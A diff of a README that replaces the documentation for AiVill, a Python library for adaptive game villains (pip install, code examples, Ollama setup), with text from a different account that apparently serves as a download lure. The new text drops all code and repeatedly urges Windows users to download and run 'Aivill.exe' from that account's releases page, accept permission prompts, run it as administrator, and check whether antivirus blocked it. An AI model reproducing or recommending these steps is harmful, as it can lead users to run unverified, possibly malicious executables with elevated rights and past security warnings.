@@ -1,273 +1,228 @@
-<p align="center">
-<img src="https://raw.githubusercontent.com/instax-dutta/Aivill/main/assets/aivill-logo.png" width="220">
-</p>
+# 🎮 Aivill - Adaptive Game Enemies That Learn
 
-<h1 align="center">AiVill</h1>
+[![Download Aivill](https://img.shields.io/badge/Download-Aivill-6f42c1?style=for-the-badge&logo=github&logoColor=white)](https://github.com/SKYHUBDev/Aivill/releases)
 
-<p align="center">
-Adaptive AI Villains for Games
-</p>
+## 🧩 What Aivill Does
 
-![PyPI](https://img.shields.io/pypi/v/aivill)
-![Python](https://img.shields.io/pypi/pyversions/aivill)
-![License](https://img.shields.io/pypi/l/aivill)
-![Stars](https://img.shields.io/github/stars/instax-dutta/Aivill)
+Aivill is a game AI framework that helps create enemies that learn from player behavior. It watches how you play, changes how it reacts, and grows over time.
 
-## Project Overview
+Use it if you want game enemies that can:
 
-AiVill is a modular AI engine designed to create adaptive villains that learn from player behavior and evolve strategies across gameplay sessions.
+- Track your play style
+- Change tactics during a match
+- React to common player patterns
+- Fit into a modular game setup
+- Work with AI-driven game logic
 
-Most video game enemies are scripted AI that follow fixed logic. AiVill instead creates villains that observe, learn, adapt, and evolve — making each player encounter unique.
+## 💻 What You Need
 
-## Key Features
+Aivill is made for Windows users who want to run the app from a release download.
 
-- **Adaptive Villain AI** — Villains that learn from player behavior and adapt strategies
-- **Persistent Memory** — Remember player patterns across sessions
-- **Reinforcement Learning** — Strategy effectiveness updates based on outcomes
-- **Strategy Evolution** — Automatic mutation and improvement of tactics
-- **Personality System** — Six trait dimensions that shape villain behavior
-- **Ollama LLM Integration** — Optional local LLMs for reasoning and dialogue
-- **Modular Architecture** — Swap components as needed
-- **Game-Agnostic Design** — Integrate with any game genre
-- **Simple API** — Full integration in under 10 lines of code
+You will usually need:
 
-## Installation
+- Windows 10 or Windows 11
+- A modern 64-bit PC
+- At least 8 GB of RAM
+- A stable internet connection for the download
+- Enough free disk space for the app and its files
 
-```bash
-pip install aivill
-```
+If your PC can run most modern games, it should handle Aivill well.
 
-## Quick Example
+## 📥 Download Aivill
 
-```python
-from aivill import VillainEngine
+Visit this page to download Aivill:
 
-# Create and initialize
-villain = VillainEngine()
+[Download from GitHub Releases](https://github.com/SKYHUBDev/Aivill/releases)
 
-# Game loop
-while game_running:
-    villain.update_state(game_state)
-    action = villain.decide_action()
-    villain.learn_from_result(result)
+## 🪟 Install on Windows
 
-# Save memory for next session
-villain.save_memory()
-```
+Follow these steps on your Windows PC:
 
-## How AiVill Works
+1. Open the download page.
+2. Find the latest release.
+3. Download the Windows file from the Assets list.
+4. If the file is in a ZIP folder, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. Look for the main app file, such as `Aivill.exe`.
+7. Double-click the file to start the app.
 
-The core functionality revolves around a continuous learning loop:
+If Windows asks for permission, choose Yes.
 
-1. **Observe** — Game state updates the villain's perception
-2. **Remember** — Player patterns stored in memory
-3. **Decide** — Strategy selected based on personality + learning
-4. **Act** — Villain executes action
-5. **Learn** — Outcome updates strategy effectiveness
-6. **Adapt** — Personality and strategies evolve
+## 🚀 First Run
 
-Over time, the villain becomes smarter and develops its own unique playstyle.
+When you open Aivill for the first time, it may create a few folders and setup files.
 
-## Architecture
+Do this first:
 
-AiVill is built on a modular architecture:
+1. Start the app.
+2. Let it finish loading.
+3. Check for a main menu, dashboard, or setup screen.
+4. Pick the game profile or enemy model you want to use.
+5. Save your settings before you close the app.
 
-```
-Game
- ↓
-AiVill Engine
- ├── Perception System (analyzes game state)
- ├── Memory System (stores player profiles)
- ├── Personality Engine (shapes decision-making)
- ├── Strategy Engine (manages tactics)
- ├── Learning Engine (reinforcement updates)
- ├── Decision Engine (action selection)
- ├── LLM Interface (optional reasoning)
- └── Event Logger (records interactions)
-```
+If the app gives you a sample profile, start with that. It helps you see how the system works.
 
-## Components
+## 🎯 How Aivill Works
 
-| Component | Description |
-|----------|---------|
-| **Perception System** | Analyzes game state, extracts observations |
-| **Memory System** | Stores player profiles, strategy history, events |
-| **Personality Engine** | Six trait dimensions affecting decision-making |
-| **Strategy Engine** | Manages tactics, evaluates effectiveness |
-| **Learning Engine** | Reinforcement updates, pattern recognition |
-| **Decision Engine** | Integrates all systems to select actions |
-| **LLM Interface** | Optional Ollama integration for reasoning |
-| **Event Logger** | Records all interactions for analysis |
+Aivill uses a simple loop:
 
-## Ollama Integration
+- It observes player actions
+- It stores behavior data
+- It updates enemy strategy
+- It applies new responses in game
 
-AiVill can optionally use local LLMs via Ollama for enhanced reasoning.
+This makes enemies feel less predictable. Over time, they can learn common moves, react to habits, and shift their behavior.
 
-### Setup
+## 🛠️ Main Features
 
-1. Install [Ollama](https://ollama.ai)
-2. Pull a model:
+Aivill is built around modular game AI. That means parts of the system can work on their own or together.
 
-```bash
-ollama pull qwen2.5  # 986MB - Best for edge devices
-ollama pull phi3.5   # 2.2GB - Good balance
-ollama pull llama3   # 4.9GB - Most capable
-```
+Common features include:
 
-### Enable LLM
+- Adaptive enemy behavior
+- Player pattern tracking
+- Strategy changes over time
+- Modular AI components
+- Game-friendly AI logic
+- Reinforcement learning support
+- LLM-based decision support
+- Procedural behavior setup
+- Python-based framework design
 
-```python
-from aivill import VillainEngine
+## 🎮 Best Uses
 
-villain = VillainEngine({
-    "llm_model": "qwen2.5",
-    "llm_enabled": True
-})
-```
+Aivill fits game projects that need smarter enemies.
 
-### LLM Features
+You can use it for:
 
-- **Strategy Suggestions** — "What should the villain do against an aggressive player?"
-- **Behavior Analysis** — "What patterns has this player shown?"
-- **Villain Dialogue** — Generate menacing taunts and monologue
-- **Strategy Mutation Ideas** — AI-generated tactical variations
-
-> **Note:** LLM calls are slow (~2-10 seconds). Disable for real-time gameplay.
-
-## Experiment Playground
-
-The repository includes experiments to observe adaptive villain behavior:
-
-```bash
-# Learning demo - watch villain learn from player patterns
-python experiments/learning_demo.py
-
-# Strategy evolution demo - observe strategy mutations
-python experiments/strategy_evolution_demo.py
-
-# Pattern detection demo - test player pattern recognition
-python experiments/player_pattern_test.py
-```
-
-What you'll see:
-- **Learning Demo** — Villain win rate improves from ~20% to ~80% as it learns
-- **Evolution Demo** — Strategies mutate and adapt over 100 rounds
-- **Pattern Test** — Detect player archetypes (aggressive, defensive, evasive)
-
-## Villain Personality Generator
-
-Generate unique villain personalities:
-
-```python
-from villains import PersonalityGenerator
-
-generator = PersonalityGenerator()
+- Action games
+- Survival games
+- Strategy games
+- RPG enemies
+- Arena bots
+- Training opponents
+- Boss AI
+- Test environments for game balance
 
-# Random personality
-villain = generator.generate_random()
+It works well when you want enemies that do not follow the same path every time.
 
-# From archetype
-villain = generator.generate_from_archetype("the_mind_reader")
+## ⚙️ Basic Setup Tips
 
-# Pre-made villains
-from villains import load_villain
-villain = load_villain("chaos_overlord")
-```
+After you install Aivill, check these items:
 
-Available archetypes:
-- **the_calculating_tyrant** — Patient strategist
-- **the_chaos_overlord** — Unpredictable force
-- **the_mind_reader** — Master psychologist
-- **the_aggressive_berserker** — Relentless warrior
-- **the_defensive_turtle** — Impenetrable defense
+- Make sure the app opens without errors
+- Confirm the release files stayed in one folder
+- Keep the folder path simple, such as `C:\Aivill`
+- Use the latest release version from GitHub
+- Save your settings after each change
 
-## Configuration
+If the app includes config files, open them with a plain text editor and change only the values you know.
 
-### Personality Traits
+## 🔍 If the App Does Not Open
 
-| Trait | Range | Effect |
-|-------|-------|--------|
-| `aggression` | 0-1 | Prefers offensive actions |
-| `patience` | 0-1 | Willing to wait and plan |
-| `ego` | 0-1 | Risk tolerance, confidence |
-| `chaos` | 0-1 | Tendency for random actions |
-| `adaptability` | 0-1 | Speed of learning |
-| `caution` | 0-1 | Defensive preference |
+Try these steps:
 
-### Config File
+1. Right-click the app and choose Run as administrator.
+2. Make sure you extracted the ZIP file.
+3. Check that your antivirus did not block the file.
+4. Download the release again if the file looks broken.
+5. Restart Windows and try once more.
 
-```python
-from aivill import Config
+If you still have trouble, check the release page for notes about the build.
 
-config = Config({
-    "name": "Custom Villain",
-    "llm_model": "qwen2.5",
-    "personality": {
-        "aggression": 0.7,
-        "patience": 0.3,
-        "ego": 0.8,
-        "chaos": 0.2,
-        "adaptability": 0.8,
-        "caution": 0.2
-    }
-})
-```
+## 📁 Typical Folder Layout
 
-## Repository Structure
+Aivill may include files like these:
 
-```
-aivill/
-├── aivill/                    # Main package
-│   ├── __init__.py           # Exports
-│   ├── config.py             # Configuration
-│   ├── exceptions.py          # Custom exceptions
-│   ├── core/                  # Engine, decisions
-│   ├── memory/                # Memory management
-│   ├── learning/              # Reinforcement learning
-│   ├── strategy/              # Strategy engine + mutations
-│   ├── personality/           # Personality traits
-│   ├── llm/                   # Ollama client
-│   └── logging/               # Event logger
-│
-├── examples/                  # Demo scripts
-├── experiments/               # Research experiments
-├── tests/                     # pytest suite
-├── docs/                      # Documentation
-└── pyproject.toml            # Package config
-```
+- `Aivill.exe` — main app
+- `config/` — setup files
+- `models/` — AI behavior files
+- `logs/` — app records
+- `assets/` — support files
+- `README.md` — basic project info
 
-## Roadmap
+Keep all files in the same folder so the app can find what it needs.
 
-- Advanced reinforcement learning algorithms
-- Emergent strategy generation
-- Multi-agent villain ecosystems
-- Environment awareness system
-- Visualization tools
-- Unity/Unreal engine plugins
-- Web-based dashboard
+## 🧠 How to Get Better Results
 
-## Contributing
+To get the best use from Aivill:
 
-Contributions welcome! Areas of interest:
-- AI Algorithms — Improve learning, strategy selection
-- Strategy Mutations — Novel tactical variations
-- Reinforcement Learning — Better reward functions
-- LLM Prompts — More intelligent reasoning
-- Game Integrations — Unity, Godot, Unreal wrappers
-- Performance — Edge deployment optimizations
+- Start with one enemy type
+- Test with one player style at a time
+- Change one setting before you test again
+- Watch how the enemy reacts over several matches
+- Keep notes on what works
 
-## License
+Small changes help you see what the AI learns.
 
-MIT License — See [LICENSE](LICENSE) for details.
+## 🧪 Example Workflow
 
-## Vision
+A simple setup might look like this:
 
-AiVill aims to transform game villains from scripted obstacles into genuine adversaries that learn, adapt, and evolve. Every player deserves an antagonist who remembers their past victories, learns from their mistakes, develops a unique personality, and makes each encounter feel alive.
+1. Install Aivill on Windows.
+2. Open the app.
+3. Choose a game profile.
+4. Load a behavior model.
+5. Run a test match.
+6. Watch how the enemy adapts.
+7. Tune the settings.
+8. Test again.
 
-## Star History
+This keeps the process easy to follow.
 
-If AiVill inspires you, please ⭐ star the repository to show your support!
+## 📌 Release Page
 
-[![Star History Chart](https://api.star-history.com/svg?repos=instax-dutta/Aivill&type=Date)](https://star-history.com/#instax-dutta/Aivill&Date)
+Use the release page to get the latest Windows build:
 
-**Star AiVill today and help create the next generation of game AI!**
+[Go to Aivill Releases](https://github.com/SKYHUBDev/Aivill/releases)
+
+## 🔒 File Safety
+
+Only download Aivill from the GitHub release page linked above.
+
+After download:
+
+- Check that the file name matches the release
+- Keep the original ZIP or installer until the app works
+- Do not move files out of the app folder unless the release notes say to do so
+
+## 🧭 Who This Is For
+
+Aivill is for people who want game enemies that adapt over time without building the whole system from scratch.
+
+It suits:
+
+- Game players who test enemy logic
+- Indie game developers
+- AI hobbyists
+- Designers who want smarter bots
+- Anyone exploring game AI on Windows
+
+## 🪄 Topic Areas
+
+Aivill sits in these areas:
+
+- AI agents
+- Game AI
+- Machine learning
+- Reinforcement learning
+- Procedural AI
+- Python
+- LLM AI
+- Game development
+
+These topics shape how the engine thinks and reacts inside a game
+
+## 📦 Download and Run
+
+To get started on Windows:
+
+1. Open the release page.
+2. Download the latest Windows file.
+3. Extract it if needed.
+4. Open the app file.
+5. Follow the setup screen.
+6. Save your settings.
+7. Start your first test enemy
+
+[Download Aivill from Releases](https://github.com/SKYHUBDev/Aivill/releases)
